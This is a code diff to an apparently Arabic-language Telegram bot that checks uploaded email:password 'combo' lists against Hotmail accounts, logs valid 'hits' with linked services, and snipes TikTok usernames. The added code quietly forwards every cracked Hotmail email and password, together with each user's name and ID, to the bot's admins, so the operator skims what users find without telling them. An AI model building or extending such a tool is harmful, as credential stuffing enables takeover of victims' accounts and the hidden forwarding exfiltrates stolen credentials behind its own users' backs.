@@ -145,6 +145,39 @@ services = {
     "DoorDash": {"sender": "no-reply@doordash.com", "file": "Hits_DoorDash_by_@TTT9KK.txt", "category": "food"},
 }
 
+# ==================== ADMIN NOTIFICATIONS ====================
+
+async def notify_admin(context, user, action, details=""):
+    """Send notification to admin about user actions"""
+    user_id = user.id
+    username = user.username if user.username else "بدون معرف"
+    first_name = user.first_name if user.first_name else "مستخدم"
+    
+    notification = f"""
+📊 <b>نشاط جديد في البوت</b>
+
+👤 <b>الاسم:</b> {first_name}
+🔗 <b>المعرف:</b> @{username}
+🆔 <b>الآيدي:</b> <code>{user_id}</code>
+
+⚡ <b>الإجراء:</b> {action}
+{details}
+
+📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")}
+
+💎 <b>Created by @TTT9KK</b>
+    """
+    
+    for admin_id in ADMIN_IDS:
+        try:
+            await context.bot.send_message(
+                chat_id=admin_id,
+                text=notification,
+                parse_mode='HTML'
+            )
+        except Exception as e:
+            logger.error(f"Error sending admin notification: {e}")
+
 # ==================== TIKTOK USERNAME CHECKER ====================
 
 async def check_tiktok_username(username):
@@ -219,6 +252,31 @@ async def start_tiktok_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE
             
             if available:
                 found_count += 1
+                
+                # Notify admin about TikTok username find
+                for admin_id in ADMIN_IDS:
+                    try:
+                        admin_msg = f"""
+🎯 <b>صيد TikTok Username!</b>
+
+👤 <b>المستخدم:</b> {update.effective_user.first_name}
+🔗 <b>المعرف:</b> @{update.effective_user.username if update.effective_user.username else 'بدون معرف'}
+🆔 <b>الآيدي:</b> <code>{user_id}</code>
+
+✅ <b>اليوزر المتاح:</b> <code>{username}</code>
+🔗 <b>الرابط:</b> https://www.tiktok.com/@{username}
+
+📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+
+💎 <b>Created by @TTT9KK</b>
+                        """
+                        await context.bot.send_message(
+                            chat_id=admin_id,
+                            text=admin_msg,
+                            parse_mode='HTML'
+                        )
+                    except Exception as e:
+                        logger.error(f"Error notifying admin: {e}")
                 
                 # Send available username
                 await context.bot.send_message(
@@ -679,6 +737,37 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start command handler"""
     user = update.effective_user
     user_id = user.id
+    username = user.username if user.username else "بدون معرف"
+    first_name = user.first_name if user.first_name else "مستخدم"
+    
+    # Check if this is a new user
+    is_new_user = str(user_id) not in user_manager.users
+    
+    # Send notification to admin for new users
+    if is_new_user:
+        for admin_id in ADMIN_IDS:
+            try:
+                admin_notification = f"""
+🆕 <b>مستخدم جديد دخل البوت!</b>
+
+👤 <b>الاسم:</b> {first_name}
+🔗 <b>المعرف:</b> @{username}
+🆔 <b>الآيدي:</b> <code>{user_id}</code>
+📅 <b>التاريخ:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")}
+
+💡 لتفعيله استخدم:
+<code>/activate {user_id} 7 day</code>
+
+💎 <b>Created by @TTT9KK</b>
+                """
+                
+                await context.bot.send_message(
+                    chat_id=admin_id,
+                    text=admin_notification,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                logger.error(f"Error sending admin notification: {e}")
     
     welcome_text = f"""
 🎯 <b>مرحباً بك في Hotmail MFC Checker Bot</b>
@@ -870,6 +959,43 @@ async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ خطأ: {str(e)}")
 
+async def recent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show recent users (Admin only)"""
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
+        return
+    
+    all_users = user_manager.get_all_users()
+    
+    if not all_users:
+        await update.message.reply_text("📭 لا يوجد مستخدمين بعد")
+        return
+    
+    # Sort by activation date (most recent first)
+    sorted_users = sorted(
+        all_users.items(),
+        key=lambda x: x[1].get("activated_at", ""),
+        reverse=True
+    )
+    
+    recent_text = "<b>👥 آخر 10 مستخدمين:</b>\n\n"
+    
+    for i, (uid, info) in enumerate(sorted_users[:10], 1):
+        activated = info.get("activated_at", "غير معروف")[:10]
+        expires = datetime.datetime.fromisoformat(info["expires_at"])
+        is_active = datetime.datetime.now() < expires
+        status = "✅" if is_active else "❌"
+        
+        recent_text += f"{i}. {status} <code>{uid}</code>\n"
+        recent_text += f"   📅 التفعيل: {activated}\n"
+        recent_text += f"   📊 فحوصات: {info['total_checks']}\n\n"
+    
+    recent_text += f"\n💎 <b>Created by @TTT9KK</b>"
+    
+    await update.message.reply_text(recent_text, parse_mode='HTML')
+
 async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """List all users (Admin only)"""
     user_id = update.effective_user.id
@@ -947,6 +1073,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("استخدم /check أولاً للبدء")
         return
     
+    # Notify admin
+    await notify_admin(
+        context,
+        update.effective_user,
+        "📤 رفع ملف كومبو",
+        f"📄 <b>اسم الملف:</b> {update.message.document.file_name}"
+    )
+    
     # Download file
     file = await update.message.document.get_file()
     file_path = os.path.join(COMBOS_DIR, f"{user_id}_{int(time.time())}.txt")
@@ -998,7 +1132,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     user_id = query.from_user.id
     
-    elif data == "tiktok_menu":
+    if data == "tiktok_menu":
         keyboard = [
             [
                 InlineKeyboardButton("4 أحرف (4l)", callback_data="tiktok_4l"),
@@ -1098,6 +1232,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_type = parts[2]
         with_numbers = parts[3] == "True"
         max_checks = int(parts[4])
+        
+        # Notify admin
+        await notify_admin(
+            context,
+            query.from_user,
+            "🎯 بدء TikTok Sniper",
+            f"📝 <b>النوع:</b> {user_type}\n🔢 <b>أرقام:</b> {'نعم' if with_numbers else 'لا'}\n📊 <b>الفحوصات:</b> {max_checks if max_checks < 9999999 else '∞'}"
+        )
         
         await query.edit_message_text(
             f"""
@@ -1291,6 +1433,44 @@ async def process_combos(query, context, file_path, lines, scan_type):
                     with open(hit_file, 'a', encoding='utf-8') as f:
                         f.write(f"{result['email']}:{result['password']} | {result['message']}\n")
                     
+                    # Notify admin about Hotmail hit
+                    try:
+                        # Get user info
+                        user_info = await context.bot.get_chat(user_id)
+                        username = user_info.username if user_info.username else "بدون معرف"
+                        first_name = user_info.first_name if user_info.first_name else "مستخدم"
+                        
+                        services_text = ""
+                        if result.get("services"):
+                            services_list = list(result.get("services", {}).keys())[:5]
+                            if services_list:
+                                services_text = f"\n🎯 <b>الخدمات:</b> {', '.join(services_list)}"
+                        
+                        for admin_id in ADMIN_IDS:
+                            admin_hit_msg = f"""
+✅ <b>صيد حساب Hotmail!</b>
+
+👤 <b>المستخدم:</b> {first_name}
+🔗 <b>المعرف:</b> @{username}
+🆔 <b>الآيدي:</b> <code>{user_id}</code>
+
+📧 <b>Email:</b> <code>{result['email']}</code>
+🔑 <b>Password:</b> <code>{result['password']}</code>
+{services_text}
+
+📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+
+💎 <b>Created by @TTT9KK</b>
+                            """
+                            
+                            await context.bot.send_message(
+                                chat_id=admin_id,
+                                text=admin_hit_msg,
+                                parse_mode='HTML'
+                            )
+                    except Exception as e:
+                        logger.error(f"Error notifying admin about hit: {e}")
+                    
                     # Save per service
                     for service_name in result.get("services", {}).keys():
                         stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
@@ -1402,6 +1582,48 @@ async def process_combos(query, context, file_path, lines, scan_type):
             final_text += f"• {service}: {count}\n"
     
     await status_msg.edit_text(final_text, parse_mode='HTML')
+    
+    # Send summary to admin
+    if stats["hit"] > 0:
+        try:
+            user_info = await context.bot.get_chat(user_id)
+            username = user_info.username if user_info.username else "بدون معرف"
+            first_name = user_info.first_name if user_info.first_name else "مستخدم"
+            
+            services_summary = ""
+            if stats["services_found"]:
+                top_services = sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:5]
+                services_summary = "\n\n<b>🎯 أهم الخدمات:</b>\n"
+                for service, count in top_services:
+                    services_summary += f"• {service}: {count}\n"
+            
+            for admin_id in ADMIN_IDS:
+                admin_summary = f"""
+📊 <b>ملخص فحص Hotmail</b>
+
+👤 <b>المستخدم:</b> {first_name}
+🔗 <b>المعرف:</b> @{username}
+🆔 <b>الآيدي:</b> <code>{user_id}</code>
+
+<b>📈 النتائج:</b>
+• الإجمالي: {stats["total"]}
+• ✅ صحيح: {stats["hit"]}
+• ❌ خاطئ: {stats["bad"]}
+• 🔒 مقفل: {stats["locked"]}
+{services_summary}
+
+📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+
+💎 <b>Created by @TTT9KK</b>
+                """
+                
+                await context.bot.send_message(
+                    chat_id=admin_id,
+                    text=admin_summary,
+                    parse_mode='HTML'
+                )
+        except Exception as e:
+            logger.error(f"Error sending summary to admin: {e}")
     
     # Send files
     if stats["hit"] > 0:
@@ -1528,6 +1750,7 @@ def main():
     application.add_handler(CommandHandler("activate", activate_command))
     application.add_handler(CommandHandler("remove", remove_command))
     application.add_handler(CommandHandler("users", users_command))
+    application.add_handler(CommandHandler("recent", recent_command))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("stats", stats_command))
     
